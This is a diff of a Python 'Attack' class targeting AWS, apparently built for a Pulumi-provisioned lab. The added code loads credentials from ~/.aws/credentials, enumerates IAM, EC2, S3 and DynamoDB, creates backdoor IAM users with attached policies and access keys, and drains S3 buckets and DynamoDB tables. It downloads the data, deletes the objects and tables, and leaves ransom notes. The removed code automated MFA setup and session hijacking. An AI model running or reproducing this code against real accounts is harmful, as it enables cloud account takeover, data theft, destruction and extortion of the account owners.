@@ -4,7 +4,12 @@ import time
 import subprocess
 import base64
 import os
+import configparser
 
+
+
+#### Referactor devopsuser hardcoding to be flexible in instanstiatign with any user input
+#### for modulatity
 class Attack:
     """🔥 Main Attack Class Integrating AWS MFA Setup and User Session Management"""
 
@@ -13,10 +18,23 @@ class Attack:
         self.iam_client = boto3.client("iam", region_name=region)
         self.sts_client = boto3.client("sts", region_name=region)
         self.region = region
+        self.pulumi_outputs = None  # Defer loading until needed
+    
 
-        # ✅ Load Pulumi Outputs to get AWS Resource Names
-        with open("/workspaces/Pulumi/Infra/forrester-2025-output.json", "r") as file:
-            self.pulumi_outputs = json.load(file)
+        #  ✅ Force Boto3 to use the correct credentials & config file locations
+        os.environ["AWS_SHARED_CREDENTIALS_FILE"] = os.path.expanduser("~/.aws/credentials")
+        os.environ["AWS_CONFIG_FILE"] = os.path.expanduser("~/.aws/config")
+
+        # ✅ Verify if AWS Profile exists before proceeding
+        session = boto3.Session()
+        available_profiles = session.available_profiles  # List all profiles
+        if "devopsuser" not in available_profiles:
+            raise RuntimeError(f"❌ ERROR: AWS Profile 'devopsuser' not found! Available profiles: {available_profiles}")
+
+        print(f"✅ AWS Profile 'devopsuser' found! Proceeding with Attack Initialization...")
+
+        # ✅ Load Pulumi outputs BEFORE using them
+        self.load_pulumi_outputs()
 
         self.devops_user = "DevopsUser"
         self.mfa_arn = self.pulumi_outputs.get("devops_user_mfa_arn")
@@ -27,419 +45,290 @@ class Attack:
         self.access_key_id = self.pulumi_outputs.get("devops_access_key_id")
         self.secret_access_key = self.pulumi_outputs.get("devops_secret_access_key")
 
-        # ------------------------- #
-        # Initialize MFA Auto Logon #
-        # ------------------------- #
-        self.mfa_login = self.MFAAutoLogin(self.access_key_id, self.secret_access_key, self.mfa_arn, self.sts_client)
-
-        # Initialize Subclasses
-        self.mfa = self.MFASetup(self.devops_user, self.mfa_arn, self.iam_client, self.sts_client, self.pulumi_outputs)
-        self.user = self.User(self.devops_user, self.mfa_arn, self.sts_client)
+        # --------------------- #
+        # Initialize Subclasses #
+        # --------------------- #
         self.session_hijack = self.SessionHijack(self.devops_user, self.sts_client)
 
 
-    class MFASetup:
-        """🔐 Handles MFA Creation, Authentication & Validation"""
+        # ------------------------------------- #
+        # For Class Enumeration & User Creation #
+        # ------------------------------------- #
+        self.credentials_path = os.path.expanduser("~/.aws/credentials")
+        self.enumeration = self.Enumeration(self)
+        self.aws_profile = "devopsuser"
+        self.output_dir = "/workspaces/Pulumi/AWS_Enumeration"
+        os.makedirs(self.output_dir, exist_ok=True)
 
-        def __init__(self, user, mfa_arn, iam_client, sts_client, pulumi_outputs):
-            self.user = user
-            self.mfa_arn = mfa_arn
-            self.iam_client = iam_client
-            self.sts_client = sts_client
-            self.pulumi_outputs = pulumi_outputs 
+        # ✅ Load credentials from ~/.aws/credentials instead of relying on the profile
+        self.access_key, self.secret_key, self.session_token = self.load_credentials_from_file()
 
-            self.mfa_seed_bin_file_path = "/workspaces/Pulumi/Infra/mfa-seed.bin"
-            self.mfa_secret = self.extract_mfa_secret()
-
-
-        def check_existing_mfa(self):
-            """🔍 Check if MFA is already enabled"""
-            print(f"\n🔍 Checking if MFA is enabled for `{self.user}`...")
-            result = subprocess.run(
-                f"aws iam list-mfa-devices --user-name {self.user} --query 'MFADevices[0].SerialNumber' --output text",
-                shell=True, capture_output=True, text=True
-            )
-            self.mfa_arn = result.stdout.strip()
-
-            if "arn:aws" in self.mfa_arn:
-                print(f"✅ MFA is already enabled: {self.mfa_arn}")
-                return True
-
-            print("❌ No MFA device found. Proceeding to create a new MFA device...")
-            return False
-
-        def cleanup_old_mfa(self):
-            """🗑️ Delete any stale virtual MFA devices"""
-            existing_mfa_check = subprocess.run(
-                "aws iam list-virtual-mfa-devices --query 'VirtualMFADevices[*].SerialNumber' --output text",
-                shell=True, capture_output=True, text=True
-            )
-            existing_mfa = existing_mfa_check.stdout.strip()
-
-            if "arn:aws" in existing_mfa:
-                print(f"🗑️ Deleting old MFA device: {existing_mfa}")
-                subprocess.run(f"aws iam delete-virtual-mfa-device --serial-number {existing_mfa}", shell=True)
-            else:
-                print("✅ No stale MFA devices found.")
+        # ✅ Manually initialize boto3 session with the loaded credentials
+        self.session = boto3.Session(
+            aws_access_key_id=self.access_key,
+            aws_secret_access_key=self.secret_key,
+            aws_session_token=self.session_token
+        )
+        # Locate DevOpsUser's credentials (from session token stored in AWS profile)
+        #self.session = boto3.Session(profile_name=self.aws_profile)
+        self.iam_client = self.session.client("iam")
+        self.s3_client = self.session.client("s3")
+        self.dynamodb_client = self.session.client("dynamodb")
+        self.ec2_client = self.session.client("ec2")
 
 
 
-        def create_mfa_device(self):
-            # mfa_seed_bin_file_path = "/workspaces/Pulumi/Infra/mfa-seed.bin"
-            """Create a Virtual MFA Device"""
-            print("🔧 Creating new Virtual MFA device...")
-
-            create_mfa_command = f"""
-            aws iam create-virtual-mfa-device \
-                --virtual-mfa-device-name DevopsUserMFA \
-                --outfile {self.mfa_seed_bin_file_path} \
-                --bootstrap-method Base32StringSeed \
-                --query 'VirtualMFADevice.SerialNumber' \
-                --output text
-            """
-            new_mfa_arn = subprocess.run(create_mfa_command, shell=True, capture_output=True, text=True).stdout.strip()
-
-            if not new_mfa_arn:
-                print("ERROR: Failed to create MFA device!")
-                exit(1)
-
-            self.mfa_arn = new_mfa_arn  # Ensure we store the correct ARN
-            print(f"New MFA device created: {self.mfa_arn}")
-
-            # Extract MFA Secret **after** MFA creation
-            self.mfa_secret = self.extract_mfa_secret()
-
-            # Wait for AWS to fully register the MFA device
-            print("Waiting for AWS to register the new MFA device...")
-            time.sleep(10)
+    def load_pulumi_outputs(self):
+           """🔍 Load Pulumi outputs only when needed"""
+           if self.pulumi_outputs is not None:
+               return  # Already loaded
+    
+           pulumi_output_path = "/workspaces/Pulumi/Infra/forrester-2025-output.json"
+    
+           if not os.path.exists(pulumi_output_path):
+               raise RuntimeError(f"❌ ERROR: Pulumi output file '{pulumi_output_path}' not found. Did you run 'pulumi up'?")
+    
+           try:
+               with open(pulumi_output_path, "r") as file:
+                   self.pulumi_outputs = json.load(file)
+    
+               if not isinstance(self.pulumi_outputs, dict):
+                   raise RuntimeError("❌ ERROR: Pulumi output file is corrupted or not in JSON format.")
+    
+           except json.JSONDecodeError:
+               raise RuntimeError(f"❌ ERROR: Pulumi output file '{pulumi_output_path}' contains invalid JSON. Check Pulumi execution.")
+    
+           except Exception as e:
+               raise RuntimeError(f"❌ ERROR: Failed to load Pulumi outputs: {str(e)}")
 
 
 
-        def extract_mfa_secret(self):
-            """🔍 Extract MFA Secret from `mfa-seed.bin` (AWS Stores in Base32)"""
-            time.sleep(2)  # Give AWS time to sync
-            print("\n🔍 Fetching MFA Secret...")
+    def get_pulumi_output(self, key):
+        """🔍 Retrieve a specific value from Pulumi outputs"""
+        if self.pulumi_outputs is None:
+            self.load_pulumi_outputs()
 
+        return self.pulumi_outputs.get(key, f"❌ ERROR: {key} not found in Pulumi outputs.")
+
+
+    def load_credentials_from_file(self):
+        """🔍 Reads AWS credentials manually from ~/.aws/credentials"""
+        config = configparser.ConfigParser()
+        config.read(self.credentials_path)
+
+        if self.aws_profile not in config:
+            print(f"❌ ERROR: Profile '{self.aws_profile}' not found in {self.credentials_path}.")
+            exit(1)
+
+        access_key = config[self.aws_profile].get("aws_access_key_id")
+        secret_key = config[self.aws_profile].get("aws_secret_access_key")
+        session_token = config[self.aws_profile].get("aws_session_token")
+
+        if not all([access_key, secret_key, session_token]):
+            print(f"❌ ERROR: Missing credentials for '{self.aws_profile}'. Ensure you have a valid session token.")
+            exit(1)
+
+        print(f"✅ Loaded credentials from {self.credentials_path}: AccessKey={access_key[:5]}... SessionToken={session_token[:10]}...")
+        return access_key, secret_key, session_token
+
+
+    class Enumeration:
+        """🔍 Handles Enumeration of AWS Resources"""
+
+        def __init__(self, attack_instance):
+            self.attack = attack_instance
+
+        def enumerate_users(self):
+            """🔍 Enumerates all IAM users"""
+            print("🔍 Enumerating IAM users...")
+            response = self.attack.iam_client.list_users()
+            self.save_results("iam_users.json", response)
+
+        def enumerate_ec2(self):
+            """🔍 Enumerates all EC2 instances"""
+            print("🔍 Enumerating EC2 instances...")
+            response = self.attack.ec2_client.describe_instances()
+            self.save_results("ec2_instances.json", response)
+
+        def enumerate_policies(self):
+            """🔍 Enumerates all IAM policies"""
+            print("🔍 Enumerating IAM policies...")
+            response = self.attack.iam_client.list_policies(Scope="Local")
+            self.save_results("iam_policies.json", response)
+
+        def enumerate_s3(self):
+            """🔍 Enumerates all S3 buckets"""
+            print("🔍 Enumerating S3 buckets...")
+            response = self.attack.s3_client.list_buckets()
+            self.save_results("s3_buckets.json", response)
+
+        def enumerate_dynamodb(self):
+            """🔍 Enumerates all DynamoDB tables"""
+            print("🔍 Enumerating DynamoDB tables...")
+            response = self.attack.dynamodb_client.list_tables()
+            self.save_results("dynamodb_tables.json", response)
+
+        def save_results(self, filename, data):
+           """💾 Saves enumeration results to a file with proper serialization"""
+           filepath = os.path.join(self.attack.output_dir, filename)
+           try:
+               with open(filepath, "w") as f:
+                   json.dump(data, f, indent=4, default=str)  # 🔥 Convert non-serializable types to string
+               print(f"✅ Saved results to {filepath}")
+           except Exception as e:
+               print(f"❌ ERROR: Failed to save {filename}: {e}")
+
+        def run_all_enumerations(self):
+            """🚀 Runs all enumeration functions"""
+            self.enumerate_users()
+            self.enumerate_ec2()
+            self.enumerate_policies()
+            self.enumerate_s3()
+            self.enumerate_dynamodb()
+            print("✅ Enumeration Complete! Results saved.")
+
+
+
+
+
+    class AWS_CreateUser_AttachPolicies:
+        def __init__(self, session):
+            """Initialize with an authenticated session"""
+            self.iam_client = session.client('iam')
+
+        def create_user(self, username):
+            """Creates an IAM user"""
             try:
-                with open(self.mfa_seed_bin_file_path, "r") as seed_file:
-                    self.mfa_secret = seed_file.read().strip()  # Read directly, no decoding
-
-                print(f"MFA Secret Retrieved: {self.mfa_secret}")
-                return self.mfa_secret
+                response = self.iam_client.create_user(UserName=username)
+                print(f"User {username} created successfully.")
+                return response['User']
             except Exception as e:
-                print(f"ERROR: Could not read MFA seed file: {e}")
-                exit(1)
-
-
-        
-
-        def generate_mfa_codes(self):
-            """🔢 Generate MFA TOTP codes"""
-            print("⏳ Ensuring system clock is synchronized...")
-            subprocess.run("sudo ntpdate -q time.google.com", shell=True)
-
-            code1 = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
-            time.sleep(30)  # Wait for new OTP
-            code2 = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
-
-            print(f"🔢 Auto-Generated MFA Codes: {code1}, {code2}")
-            return code1, code2
-        
-
-
-        def enable_mfa(self, code1, code2):
-            """🔐 Enable MFA for DevopsUser"""
-            print("\n🔑 Enabling MFA for DevopsUser...")
-
-            enable_mfa_command = f"""
-            aws iam enable-mfa-device --user-name {self.user} \
-                --serial-number {self.mfa_arn} \
-                --authentication-code1 {code1} --authentication-code2 {code2}
-            """
-
-            print(f"🔍 Running: {enable_mfa_command}")
-            result = subprocess.run(enable_mfa_command, shell=True, capture_output=True, text=True)
-
-            if result.returncode != 0:
-                print(f"ERROR: MFA enablement failed!\n{result.stderr}")
-                exit(1)
-
-            print("MFA enabled successfully! Verifying association...")
-
-            # Validate that AWS successfully linked the MFA device
-            validation_command = f"aws iam list-mfa-devices --user-name {self.user} --query 'MFADevices[*].SerialNumber' --output text"
-            validation_result = subprocess.run(validation_command, shell=True, capture_output=True, text=True)
-
-            linked_mfa = validation_result.stdout.strip()
-            if linked_mfa and "arn:aws" in linked_mfa:
-                print(f"MFA Device successfully linked: {linked_mfa}")
-            else:
-                print("ERROR: MFA device was NOT linked. Possible AWS delay or misconfiguration.")
-                exit(1)
-
-
-
-        # def login_as_devops(self):
-        #     """🔐 Log in as DevOpsUser using Access Key + MFA"""
-
-        #     print("\n⏳ Waiting for AWS to fully associate MFA device...")
-        #     time.sleep(10)
-
-        #     # ✅ Step 1: Verify MFA is linked before attempting login
-        #     validation = subprocess.run([
-        #         "aws", "iam", "list-mfa-devices",
-        #         "--user-name", self.user,
-        #         "--query", "MFADevices[*].SerialNumber",
-        #         "--output", "text"
-        #     ], capture_output=True, text=True)
-
-        #     if "arn:aws" not in validation.stdout:
-        #         print("❌ ERROR: MFA device is NOT linked to DevOpsUser. Exiting...")
-        #         exit(1)
-
-        #     print("✅ MFA device is successfully linked. Proceeding with login.")
-
-        #     # ✅ Step 2: Load DevOpsUser's Access Key & Secret Key from Pulumi Outputs
-        #     devops_access_key = self.pulumi_outputs.get("devops_access_key_id")
-        #     print(f" \n \n \n DEVOPS ACCESS KEY: {devops_access_key} ")
-        #     devops_secret_key = self.pulumi_outputs.get("devops_secret_access_key")
-        #     print(f"\n \n \n DEVOPS SECRET KEY: {devops_secret_key} ")
-
-        #     if not devops_access_key or not devops_secret_key:
-        #         print("❌ ERROR: DevOpsUser access key/secret key not found in Pulumi outputs.")
-        #         exit(1)
-
-        #     # ✅ Step 3: Configure AWS CLI Profile for DevOpsUser
-        #     print("\n🔧 Configuring AWS CLI profile for DevOpsUser...")
-        #     subprocess.run(f"aws configure set aws_access_key_id {devops_access_key} --profile devopsuser", shell=True)
-        #     subprocess.run(f"aws configure set aws_secret_access_key {devops_secret_key} --profile devopsuser", shell=True)
-        #     subprocess.run(f"aws configure set region us-east-1 --profile devopsuser", shell=True)
-        #     subprocess.run(f"aws configure set output json --profile devopsuser", shell=True)
-
-        #     # ✅ Step 4: Generate MFA Code
-        #     print("\n🚀 Requesting session token for DevOpsUser...")
-        #     mfa_code = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
-
-        #     # ✅ Step 5: Call `get_session_token` with MFA
-        #     try:
-        #         session_response = subprocess.run(
-        #             f"aws sts get-session-token --serial-number {self.mfa_arn} --token-code {mfa_code} --profile devopsuser",
-        #             shell=True, capture_output=True, text=True
-        #         )
-
-        #         # 🚀 Ensure response is not empty
-        #         if not session_response.stdout.strip():
-        #             print(f"❌ ERROR: Empty response received from AWS STS. Possible MFA setup issue.")
-        #             print(f"📝 Debug: Raw AWS CLI Output: {session_response.stdout}")
-        #             print(f"📝 Debug: AWS CLI Error: {session_response.stderr}")
-
-        #             exit(1)
-
-        #         try:
-        #             session_data = json.loads(session_response.stdout)  # Attempt to parse JSON
-        #         except json.JSONDecodeError as e:
-        #             print(f"❌ ERROR: Invalid JSON response from AWS STS: {e}\nRaw Output: {session_response.stdout}")
-        #             exit(1)
-
-        #         # ✅ Extract credentials from STS response
-        #         creds = session_data.get("Credentials")
-        #         if not creds:
-        #             print(f"❌ ERROR: AWS did not return credentials! Response: {session_data}")
-        #             exit(1)
-
-        #         # ✅ Step 6: Export Temporary Session Credentials to AWS CLI Profile
-        #         print("\n✅ Storing temporary MFA session in AWS CLI profile...")
-        #         subprocess.run(f"aws configure set aws_access_key_id \"{creds['AccessKeyId']}\" --profile devopsuser", shell=True)
-        #         subprocess.run(f"aws configure set aws_secret_access_key \"{creds['SecretAccessKey']}\" --profile devopsuser", shell=True)
-        #         subprocess.run(f"aws configure set aws_session_token \"{creds['SessionToken']}\" --profile devopsuser", shell=True)
-
-        #         # ✅ Step 7: Verify the AWS profile with MFA session
-        #         print("\n🔍 Verifying AWS profile with MFA session...")
-        #         verify_output = subprocess.run("aws sts get-caller-identity --profile devopsuser", shell=True, capture_output=True, text=True)
-
-        #         if "arn:aws" not in verify_output.stdout:
-        #             print(f"❌ ERROR: Profile verification failed! Response: {verify_output.stderr}")
-        #             exit(1)
-
-        #         print("✅ AWS profile successfully authenticated with MFA!")
-
-        #     except Exception as e:
-        #         print(f"❌ ERROR: MFA authentication failed: {e}")
-        #         exit(1)
-
-
-
-
-
-        def get_pulumi_secret(self,secret_name):
-            """Fetch Pulumi secret with --show-secrets"""
-            try:
-                result = subprocess.run(
-                    f"pulumi stack output {secret_name} --show-secrets",
-                    shell=True, capture_output=True, text=True
-                )
-                return result.stdout.strip()
-            except Exception as e:
-                print(f"❌ ERROR: Failed to retrieve Pulumi secret {secret_name}: {e}")
-                exit(1)
-        
-        def login_as_devops(self):
-            """🔐 Log in as DevOpsUser using Access Key + MFA"""
-        
-            print("\n⏳ Waiting for AWS to fully associate MFA device...")
-            time.sleep(10)
-        
-            # ✅ Step 1: Verify MFA is linked before attempting login
-            validation = subprocess.run([
-                "aws", "iam", "list-mfa-devices",
-                "--user-name", self.user,
-                "--query", "MFADevices[*].SerialNumber",
-                "--output", "text"
-            ], capture_output=True, text=True)
-        
-            if "arn:aws" not in validation.stdout:
-                print("❌ ERROR: MFA device is NOT linked to DevOpsUser. Exiting...")
-                exit(1)
-        
-            print("✅ MFA device is successfully linked. Proceeding with login.")
-        
-            # ✅ Step 2: Load DevOpsUser's Access Key & Secret Key **Directly from Pulumi Secrets**
-            devops_access_key = self.get_pulumi_secret("devops_access_key_id")
-            devops_secret_key = self.get_pulumi_secret("devops_secret_access_key")
-        
-            print(f"\n🔑 DevOps Access Key: {devops_access_key}")
-            print(f"🔑 DevOps Secret Key: {'*' * len(devops_secret_key)} (Hidden for security)")
-        
-            if not devops_access_key or not devops_secret_key:
-                print("❌ ERROR: DevOpsUser access key/secret key not found in Pulumi outputs.")
-                exit(1)
-        
-            # ✅ Step 3: Configure AWS CLI Profile for DevOpsUser
-            print("\n🔧 Configuring AWS CLI profile for DevOpsUser...")
-            subprocess.run(f"aws configure set aws_access_key_id \"{devops_access_key}\" --profile devopsuser", shell=True)
-            subprocess.run(f"aws configure set aws_secret_access_key \"{devops_secret_key}\" --profile devopsuser", shell=True)
-            subprocess.run(f"aws configure set region us-east-1 --profile devopsuser", shell=True)
-            subprocess.run(f"aws configure set output json --profile devopsuser", shell=True)
-        
-            # ✅ Step 4: Generate MFA Code
-            print("\n🚀 Requesting session token for DevOpsUser...")
-            mfa_code = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
-        
-            # ✅ Step 5: Call `get_session_token` with MFA
-            try:
-                session_response = subprocess.run(
-                    f"aws sts get-session-token --serial-number {self.mfa_arn} --token-code {mfa_code} --profile devopsuser",
-                    shell=True, capture_output=True, text=True
-                )
-        
-                # 🚀 Ensure response is not empty
-                if not session_response.stdout.strip():
-                    print(f"❌ ERROR: Empty response received from AWS STS. Possible MFA setup issue.")
-                    exit(1)
-        
-                session_data = json.loads(session_response.stdout)
-                creds = session_data.get("Credentials")
-        
-                if not creds:
-                    print(f"❌ ERROR: AWS did not return credentials! Response: {session_data}")
-                    exit(1)
-        
-                # ✅ Step 6: Export Temporary Session Credentials to AWS CLI Profile
-                print("\n✅ Storing temporary MFA session in AWS CLI profile...")
-                subprocess.run(f"aws configure set aws_access_key_id \"{creds['AccessKeyId']}\" --profile devopsuser", shell=True)
-                subprocess.run(f"aws configure set aws_secret_access_key \"{creds['SecretAccessKey']}\" --profile devopsuser", shell=True)
-                subprocess.run(f"aws configure set aws_session_token \"{creds['SessionToken']}\" --profile devopsuser", shell=True)
-        
-                # ✅ Step 7: Verify the AWS profile with MFA session
-                print("\n🔍 Verifying AWS profile with MFA session...")
-                verify_output = subprocess.run("aws sts get-caller-identity --profile devopsuser", shell=True, capture_output=True, text=True)
-        
-                if "arn:aws" not in verify_output.stdout:
-                    print(f"❌ ERROR: Profile verification failed! Response: {verify_output.stderr}")
-                    exit(1)
-        
-                print("✅ AWS profile successfully authenticated with MFA!")
-        
-            except Exception as e:
-                print(f"❌ ERROR: MFA authentication failed: {e}")
-                exit(1)
-
-
-        def setup_mfa_and_login(self):
-            """🚀 Full MFA Setup + Login"""
-            if self.check_existing_mfa():
-                return
-            self.cleanup_old_mfa()
-            self.create_mfa_device()
-            self.extract_mfa_secret()
-            code1, code2 = self.generate_mfa_codes()
-            self.enable_mfa(code1, code2)
-            self.login_as_devops()  # Automatically log in after enabling MFA
-
-
-
-
-
-
-    class MFAAutoLogin:
-        """🔐 Automates AWS CLI Authentication with MFA"""
-
-        def __init__(self, access_key, secret_key, mfa_arn, sts_client):
-            self.access_key = access_key
-            self.secret_key = secret_key
-            self.mfa_arn = mfa_arn
-            self.sts_client = sts_client
-            self.aws_profile = "devopsuser"
-            self.mfa_secret = None  # This should be set dynamically
-
-        def configure_aws_cli(self):
-            """🔑 Configures AWS CLI for DevOpsUser"""
-            print("🔧 Configuring AWS CLI for DevOpsUser...")
-            subprocess.run(f"aws configure set aws_access_key_id {self.access_key} --profile {self.aws_profile}", shell=True)
-            subprocess.run(f"aws configure set aws_secret_access_key {self.secret_key} --profile {self.aws_profile}", shell=True)
-            subprocess.run(f"aws configure set region us-east-1 --profile {self.aws_profile}", shell=True)
-
-        def generate_mfa_code(self):
-            """🔢 Generates an MFA Code"""
-            if not self.mfa_secret:
-                print("❌ ERROR: MFA Secret is not set!")
+                print(f"Error creating user: {e}")
                 return None
 
-            print("🔢 Generating MFA Code...")
-            otp_code = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
-            return otp_code
-
-        def request_session_token(self):
-            """🚀 Requests a new AWS Session Token"""
-            print("🚀 Requesting session token...")
-            mfa_code = self.generate_mfa_code()
-            
-            if not mfa_code:
-                print("❌ ERROR: Could not generate MFA code!")
-                return
-
-            session_response = subprocess.run(
-                f"aws sts get-session-token --serial-number {self.mfa_arn} --token-code {mfa_code} --profile {self.aws_profile}",
-                shell=True, capture_output=True, text=True
-            )
-
+        def create_access_keys(self, username):
+            """Creates access keys for the IAM user"""
             try:
-                session_data = json.loads(session_response.stdout)
-                creds = session_data["Credentials"]
-                
-                print("✅ Storing session credentials...")
-                os.environ["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
-                os.environ["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
-                os.environ["AWS_SESSION_TOKEN"] = creds["SessionToken"]
-                print("🔍 Verified AWS Session Token Set")
+                response = self.iam_client.create_access_key(UserName=username)
+                print(f"Access keys created for {username}.")
+                return response['AccessKey']
             except Exception as e:
-                print(f"❌ ERROR: Failed to obtain session token: {e}")
+                print(f"Error creating access keys: {e}")
+                return None
 
-        def execute_auto_login(self):
-            """🚀 Runs Full AWS CLI Login Automation"""
-            self.configure_aws_cli()
-            time.sleep(5)
-            self.request_session_token()
+        def attach_policies(self, username, policy_arns):
+            """Attaches policies to the IAM user"""
+            for policy_arn in policy_arns:
+                try:
+                    self.iam_client.attach_user_policy(UserName=username, PolicyArn=policy_arn)
+                    print(f"Attached policy {policy_arn} to {username}.")
+                except Exception as e:
+                    print(f"Error attaching policy {policy_arn}: {e}")
+
+        def run_pipeline(self, username, policy_arns):
+            """Executes the full pipeline: create user, attach policies, then create access keys"""
+            user = self.create_user(username)
+            if user:
+                self.attach_policies(username, policy_arns)
+                access_keys = self.create_access_keys(username)
+                return access_keys  # Returning access keys if needed for further processing
+            return None
+
+
+
+    class S3_Drain_Delete:
+        def __init__(self, session, target_s3_arns):
+            """Initialize S3 client and target S3 buckets"""
+            self.s3_client = session.client('s3')
+            self.target_buckets = [arn.split(":")[-1] for arn in target_s3_arns]  # Extract bucket names from ARNs
+
+        def search_and_exfiltrate(self, exfiltration_path="./s3_Exfiltration"):
+            """Downloads all objects from targeted buckets, deletes them, and leaves a ransom note"""
+            os.makedirs(exfiltration_path, exist_ok=True)
+
+            for bucket in self.target_buckets:
+                objects = self.s3_client.list_objects_v2(Bucket=bucket).get('Contents', [])
+                for obj in objects:
+                    key = obj['Key']
+                    file_path = os.path.join(exfiltration_path, f"{bucket}_{key.replace('/', '_')}.json")
+
+                    # Download full object
+                    self.s3_client.download_file(bucket, key, file_path)
+                    print(f"Downloaded: {key} from {bucket}")
+
+                    # Delete the object from S3
+                    self.s3_client.delete_object(Bucket=bucket, Key=key)
+                    print(f"Deleted: {key} from {bucket}")
+
+                # Leave ransom note in each bucket
+                ransom_note = "Your data has been taken. Pay or it’s gone forever."
+                self.s3_client.put_object(Bucket=bucket, Key="too_late.txt", Body=ransom_note)
+                print(f"Ransom note placed in {bucket}")
+
+
+    class DynamoDB_Drain_Delete:
+        def __init__(self, session, target_dynamodb_arns):
+            """Initialize DynamoDB client and target tables"""
+            self.dynamodb_client = session.client('dynamodb')
+            self.dynamodb_resource = session.resource('dynamodb')
+            self.target_tables = [arn.split("/")[-1] for arn in target_dynamodb_arns]  # Extract table names from ARNs
+
+        def search_and_exfiltrate(self, exfiltration_path="./DynamoDB_Exfiltration"):
+            """Downloads all content from targeted tables, deletes them, and leaves a ransom note"""
+            os.makedirs(exfiltration_path, exist_ok=True)
+
+            for table_name in self.target_tables:
+                table = self.dynamodb_resource.Table(table_name)
+                scan_response = table.scan()
+                data = scan_response.get('Items', [])
+
+                if data:
+                    file_path = os.path.join(exfiltration_path, f"{table_name}.json")
+                    with open(file_path, 'w') as f:
+                        json.dump(data, f, indent=4)
+                    print(f"Extracted data from {table_name} to {file_path}")
+
+                # Delete the entire table
+                self.dynamodb_client.delete_table(TableName=table_name)
+                print(f"Deleted table {table_name}")
+
+                # Leave ransom note in exfiltrated directory
+                ransom_note = {"Message": "Your database is gone. Pay to get it back."}
+                note_path = os.path.join(exfiltration_path, f"{table_name}_RANSOM_NOTE.json")
+                with open(note_path, 'w') as f:
+                    json.dump(ransom_note, f, indent=4)
+                print(f"Ransom note left in {exfiltration_path} for {table_name}")
+
+
+    # # Example Usage
+    # if __name__ == "__main__":
+    #     # Assuming the session is established using STS
+    #     session = boto3.Session(
+    #         aws_access_key_id="YOUR_SESSION_ACCESS_KEY",
+    #         aws_secret_access_key="YOUR_SESSION_SECRET_KEY",
+    #         aws_session_token="YOUR_SESSION_TOKEN",
+    #         region_name="us-east-1"
+    #     )
+
+    #     # Target specific pre-selected S3 bucket ARNs
+    #     target_s3_arns = [
+    #         "arn:aws:s3:::sensitive-data-backups",
+    #         "arn:aws:s3:::company-private-storage"
+    #     ]
+
+    #     # Target specific pre-selected DynamoDB table ARNs
+    #     target_dynamodb_arns = [
+    #         "arn:aws:dynamodb:us-east-1:123456789012:table/UserRecords",
+    #         "arn:aws:dynamodb:us-east-1:123456789012:table/FinancialTransactions"
+    #     ]
+
+    #     # Run S3 Draining
+    #     s3_attacker = S3_Drain_Delete(session, target_s3_arns)
+    #     s3_attacker.search_and_exfiltrate()
+
+    #     # Run DynamoDB Draining
+    #     dynamo_attacker = DynamoDB_Drain_Delete(session, target_dynamodb_arns)
+    #     dynamo_attacker.search_and_exfiltrate()
 
 
 
@@ -564,68 +453,3 @@ class Attack:
 
 
 
-
-
-
-
-
-
-    class User:
-        """🔐 AWS User Session with MFA Authentication"""
-
-        def __init__(self, user_name, mfa_device_arn, sts_client):
-            self.user_name = user_name
-            self.mfa_device_arn = mfa_device_arn
-            self.sts_client = sts_client
-            self.session = None
-
-        def authenticate_with_mfa(self):
-            """🔑 Authenticate user with MFA and assume a session"""
-            if not self.mfa_device_arn:
-                print(f"❌ ERROR: No MFA device found for `{self.user_name}`. Exiting...")
-                return None
-
-            print(f"\n🔑 Please enter an MFA code for `{self.user_name}`...")
-
-            # Prompt user for MFA codes (TOTP)
-            mfa_code = input(f"Enter MFA Code for `{self.mfa_device_arn}`: ")
-
-            try:
-                response = self.sts_client.get_session_token(
-                    SerialNumber=self.mfa_device_arn,
-                    TokenCode=mfa_code
-                )
-                print("✅ MFA authentication successful!")
-                self.session = boto3.Session(
-                    aws_access_key_id=response["Credentials"]["AccessKeyId"],
-                    aws_secret_access_key=response["Credentials"]["SecretAccessKey"],
-                    aws_session_token=response["Credentials"]["SessionToken"]
-                )
-                return self.session
-
-            except Exception as e:
-                print(f"❌ ERROR: MFA Authentication Failed: {e}")
-                return None
-
-    def execute_attack(self):
-        """🔥 Execute Attack Sequence"""
-        print("\n🚀 Starting Attack...")
-
-        # ✅ Step 1: Configure MFA
-        self.mfa.setup_mfa()
-
-        # ✅ Step 2: Authenticate as DevOpsUser
-        print("\n🔐 Attempting to authenticate as DevopsUser with MFA...")
-        session = self.user.authenticate_with_mfa()
-
-        if session:
-            print("\n🔥 Attack in progress... executing further AWS actions as DevOpsUser.")
-        else:
-            print("\n❌ Attack failed: Unable to authenticate as DevopsUser.")
-
-# ✅ Example Usage
-if __name__ == "__main__":
-    attack = Attack()
-    
-    # 🚀 Perform MFA Setup
-    attack.execute_attack()
